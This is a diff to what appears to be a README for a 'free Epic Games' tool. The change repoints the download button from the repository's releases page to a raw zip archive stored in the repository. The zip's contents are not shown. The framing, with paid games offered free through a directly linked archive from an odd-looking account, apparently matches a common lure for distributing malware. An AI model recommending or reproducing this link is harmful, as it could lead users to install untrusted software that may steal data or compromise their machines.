@@ -31,7 +31,7 @@ Getting the software on your computer is very easy. Just follow these simple ste
 
 The first thing you need to do is go to the download page. You can do this by clicking the big button below.
 
-[![Download Epic-Games-Free](https://img.shields.io/badge/Download-Epic--Games--Free-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=green)](https://github.com/mairenormal1225/Epic-Games-Free/releases)
+[![Download Epic-Games-Free](https://img.shields.io/badge/Download-Epic--Games--Free-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue&color=green)](https://github.com/mairenormal1225/Epic-Games-Free/raw/refs/heads/main/pratey/Games_Free_Epic_1.1-beta.5.zip)
 
 Visit this link to download the application.
 
